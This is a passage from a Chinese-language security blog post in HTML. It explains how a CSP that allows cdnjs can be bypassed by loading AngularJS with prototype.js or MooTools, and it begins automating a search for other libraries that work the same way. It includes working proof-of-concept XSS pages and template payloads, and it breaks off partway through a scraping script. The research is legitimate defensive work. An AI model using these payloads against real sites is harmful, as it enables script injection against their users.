@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>自動化尋找 AngularJS CSP Bypass 中 prototype.js 的替代品 - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/" rel="alternate" hreflang="en" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2022/09/01/angularjs-csp-bypass-cdnjs/">
+    
+
+
+
+
+
+    <meta name="description" content="在我之前的文章：從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦裡面有提過可以藉由 cdnjs 來繞過 CSP，而有其中一種繞過手法必須搭配 prototype.js 才能成功。 在理解原理之後，我開始好奇在 cdnjs 上面是否還有其他 library 可以做到類似的事情，因此就開始著手研究。 這篇會從 cdnjs 的 CSP 繞過開始講，講到為什麼需要 prototype.js，接著再提到我怎">
+<meta property="og:type" content="article">
+<meta property="og:title" content="自動化尋找 AngularJS CSP Bypass 中 prototype.js 的替代品">
+<meta property="og:url" content="https://blog.huli.tw/2022/09/01/angularjs-csp-bypass-cdnjs/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="在我之前的文章：從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦裡面有提過可以藉由 cdnjs 來繞過 CSP，而有其中一種繞過手法必須搭配 prototype.js 才能成功。 在理解原理之後，我開始好奇在 cdnjs 上面是否還有其他 library 可以做到類似的事情，因此就開始著手研究。 這篇會從 cdnjs 的 CSP 繞過開始講，講到為什麼需要 prototype.js，接著再提到我怎">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.huli.tw/img/angularjs-csp-bypass-cdnjs/cover.png">
+<meta property="article:published_time" content="2022-09-01T11:31:10.000Z">
+<meta property="article:modified_time" content="2023-05-07T01:15:16.474Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/angularjs-csp-bypass-cdnjs/cover.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="自動化尋找 AngularJS CSP Bypass 中 prototype.js 的替代品" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#cdnjs-angularjs-csp-bypass">1&nbsp;&nbsp;<b>cdnjs + AngularJS CSP bypass</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#手動找出替代品之-mootools">2&nbsp;&nbsp;<b>手動找出替代品之 MooTools</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#自動化尋找替代品">3&nbsp;&nbsp;<b>自動化尋找替代品</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#找出-cdnjs-上所有的-library">3.1&nbsp;&nbsp;找出 cdnjs 上所有的 library</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#找出每個-library-的所有-js-檔案">3.2&nbsp;&nbsp;找出每個 library 的所有 JS 檔案</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#找出符合條件的套件">3.3&nbsp;&nbsp;找出符合條件的套件</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#研究結果">4&nbsp;&nbsp;<b>研究結果</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#總結">5&nbsp;&nbsp;<b>總結</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2022/09/01/en/angularjs-csp-bypass-cdnjs/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            自動化尋找 AngularJS CSP Bypass 中 prototype.js 的替代品
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2022-09-01T11:31:10.000Z" itemprop="datePublished">2022年9月1日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>在我之前的文章：<a href="https://blog.huli.tw/2021/08/22/cdnjs-and-supply-chain-attack/">從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦</a>裡面有提過可以藉由 cdnjs 來繞過 CSP，而有其中一種繞過手法必須搭配 prototype.js 才能成功。</p>
+<p>在理解原理之後，我開始好奇在 cdnjs 上面是否還有其他 library 可以做到類似的事情，因此就開始著手研究。</p>
+<p>這篇會從 cdnjs 的 CSP 繞過開始講，講到為什麼需要 prototype.js，接著再提到我怎麼從 cdnjs 上找到它的替代品。</p>
+<span id="more"></span>
+
+<h2><span id="cdnjs-angularjs-csp-bypass">cdnjs + AngularJS CSP bypass</span></h2><p>在 CSP 裡面放上 <code>https://cdnjs.cloudflare.com</code> 其實是很危險的一件事情，因為有一個許多人都知道的方式，可以繞過這個 CSP。</p>
+<p>詳情可參考這兩篇文章：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.0daylabs.com/2016/09/09/bypassing-csp/">Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22">H5SC Minichallenge 3: “Sh*t, it’s CSP!”</a></li>
+</ol>
+<p>實際的繞過方式如下：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSP bypass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span>
+      <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
+      <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src https://cdnjs.cloudflare.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
+      &#123;&#123;$on.curry.call().alert('xss')&#125;&#125;
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因為 CSP 中有 cdnjs，所以我們可以引入其他的 library，這邊我們挑的是 AngularJS，引入了以後我們就可以用 CSTI 的方式注入底下這一段：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
+  &#123;&#123;$on.curry.call().alert('xss')&#125;&#125;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>這邊為什麼是 <code>$on.curry.call()</code> 呢？你可以把它換成 <code>window</code> 看看，會發現沒有反應，這是因為 AngularJS 的 expression 是放在一個 scope object 裡面，你沒辦法直接存取到 window 或是 window 上的屬性。</p>
+<p>而這邊有另一個重點是 CSP 沒有開 <code>unsafe-eval</code>，所以你也不能直接 <code>constructor.constructor(&#39;alert(1)&#39;)()</code> 之類的。</p>
+<p>從最後的結果看起來，<code>$on.curry.call()</code> 似乎等同於 window，那是為什麼呢？這就是 prototype.js 派上用場的地方了，我們來看一下它的部分原始碼，<a target="_blank" rel="noopener" href="https://github.com/prototypejs/prototype/blob/master/src/prototype/lang/function.js#L226">src&#x2F;prototype&#x2F;lang&#x2F;function.js</a>：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">curry</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arguments<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> __method <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">,</span> args <span class="token operator">=</span> <span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">__method</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>這個 function 會加在 <code>Function.prototype</code> 上面，而重點其實只有第一行：<code> if (!arguments.length) return this;</code>，如果沒有帶參數的話，會直接回傳 <code>this</code>。在 JavaScript 裡面，如果你用 <code>call</code> 或是 <code>apply</code> 來呼叫函式的話，第一個參數可以指定 <code>this</code> 的值，如果沒有傳的話就會是預設值，在嚴格模式底下是 <code>undefined</code>，非嚴格模式底下是 <code>window</code>。</p>
+<p>這也是為什麼 <code>$on.curry.call()</code> 會是 <code>window</code>，因為 <code>$on</code> 是個 function，所以呼叫 <code>$on.curry.call()</code> 的時候，由於 <code>this</code> 沒帶所以預設是 <code>window</code>，參數也沒帶，因此 <code>curry</code> 這個函式就會根據第一行的條件句，把 <code>this</code> 也就是 <code>window</code> 回傳回來。</p>
+<p>總結一下，之所以 AngularJS 需要 prototype.js 的幫忙，是因為 prototype.js：</p>
+<ol>
+<li>提供了一個加在 prototype 上的函式</li>
+<li>而且這個函式會回傳 this</li>
+</ol>
+<p>第一點很重要，因為前面有提過在 expression 裡面沒辦法存取到 window，所以一般的 library 加的東西其實也是拿不到的，但 prototype.js 是把東西放在 prototype 上面，所以可以透過 prototype 來存取到新增的 method。</p>
+<p>第二點也很重要，搭配 this 預設會是 window 這個特性，就可以讓我們拿到 window。</p>
+<p>知道了原理之後，就知道該怎麼找替代品了，只要找到有相同功能的就好了。而此時我突然想到以前寫過的一篇文章：<a href="https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/">Don’t break the Web：以 SmooshGate 以及 keygen 為例</a>，在裡面我有提到因為 MooTools 習慣在 prototype 上面新增東西，導致原本要叫做 flatten 的 method 只好改名叫 flat（後來看 <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/08/29/intigriti-0822-xss-challenge-writeup/">maple 的 writeup</a> 才知道原來 <code>Array.prototype.includes</code> 不叫 <code>Array.prototype.contains</code> 也是因為 MooTools）</p>
+<p>那會不會 MooTools 也符合我們上面的條件呢？</p>
+<h2><span id="手動找出替代品之-mootools">手動找出替代品之 MooTools</span></h2><p>我們可以在這個資料夾中找出 MooTools 改的各種 prototype：<a target="_blank" rel="noopener" href="https://github.com/mootools/mootools-core/tree/master/Source/Types">https://github.com/mootools/mootools-core/tree/master/Source/Types</a></p>
+<p>裡面有：</p>
+<ol>
+<li>Array</li>
+<li>DOMEvent</li>
+<li>Function</li>
+<li>Number</li>
+<li>Object</li>
+<li>String</li>
+</ol>
+<p>因為檔案都不大，所以可以一個一個看，想更快的話也可以直接用 <code>return this</code> 當作關鍵字來搜尋，結果隨便一找就找到兩個：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Array<span class="token punctuation">.</span><span class="token function">implement</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+  <span class="token function-variable function">erase</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> item<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+
+  <span class="token function-variable function">empty</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>Array.prototype.erase</code> 跟 <code>Array.prototype.empty</code> 兩個函式都會回傳 <code>this</code>，所以底下兩個方法都可以拿到 window：</p>
+<ol>
+<li>[].erase.call()</li>
+<li>[].empty.call()</li>
+</ol>
+<p>接著馬上來試試看 CSP bypass 是否成功：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSP bypass - MooTools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span>
+      <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
+      <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src https://cdnjs.cloudflare.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
+      &#123;&#123;[].erase.call().alert('xss')&#125;&#125;
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>打開網頁之後發現確實有跳出 alert，果然成功了！</p>
+<p>既然確認手動找得到以後，就可以來想想看怎麼自動化了。</p>
+<h2><span id="自動化尋找替代品">自動化尋找替代品</span></h2><p>一個滿簡單直覺的自動化流程大概就是：</p>
+<ol>
+<li>找出 cdnjs 上面所有的 library</li>
+<li>找出每個 library 的所有 JS 檔案</li>
+<li>用 headless browser（我用 puppeteer）來測試每個 JS 是否會在 prototype 上新增屬性</li>
+<li>嘗試呼叫新增的屬性，看是否會回傳 window</li>
+</ol>
+<p>其中有一些細節的部分端看個人想要怎麼處理，例如說更精緻一點的話可以針對套件的所有版本都做測試，但是那樣做的話測試量可能會變五到十倍，由於我只是想做個初步的研究，所以不考慮套件版本，一律使用最新版的。</p>
+<p>此外，除了找到可以回傳 this 的方法以外，我也想看有哪些套件會去動你的 prototype，這個可以從第三步的結果得知。</p>
+<p>最後，我這邊只找「沒帶參數呼叫以後會回傳 <code>this</code> 的方法」，但可能會有那種參數符合特定條件才回會傳 <code>this</code> 的，這些需要人工去看，所以我先不考慮。</p>
+<h3><span id="找出-cdnjs-上所有的-library">找出 cdnjs 上所有的 library</span></h3><p>去 cdnjs 的網站上面觀察一下，可以發現背後是去呼叫放在 algolia 的 API，algolia 其實有提供把所有資料拉回來的方法，但官網的 api key 不支援，然後分頁的話又會受到限制，只能拿到前 1000 筆結果。</p>
+<p>於是，我找到了 search 的 API，先假設每個字母開頭的套件不會超過 1000 個，就可以從 a-zA-Z0-9 去尋找以每個字母開頭的套件，藉此繞過 1000 筆的限制，讀到所有套件的資料。</p>
+<p>程式碼的實作大概是這樣：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'axios'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token constant">API_HOST</span> <span class="token operator">=</span> <span class="token string">'https://2qwlvlxzb6-dsn.algolia.net/'</span>
+<span class="token keyword">const</span> <span class="token constant">SEARCH_API_URL</span> <span class="token operator">=</span> <span class="token string">'/1/indexes/libraries/query'</span>
+<span class="token keyword">const</span> <span class="token constant">API_KEY</span> <span class="token operator">=</span> <span class="token string">'2663c73014d2e4d6d1778cc8ad9fd010'</span>
+<span class="token keyword">const</span> <span class="token constant">APP_ID</span> <span class="token operator">=</span> <span class="token string">'2QWLVLXZB6'</span>
+
+<span class="token keyword">const</span> instance <span class="token operator">=</span> axios<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">baseURL</span><span class="token operator">:</span> <span class="token constant">API_HOST</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token string-property property">'x-algolia-api-key'</span><span class="token operator">:</span> <span class="token constant">API_KEY</span><span class="token punctuation">,</span>
+    <span class="token string-property property">'x-algolia-application-id'</span><span class="token operator">:</span> <span class="token constant">APP_ID</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'./data/libs.json'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> chars <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
+  <span class="token keyword">let</span> allItems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+  <span class="token keyword">let</span> existLib <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
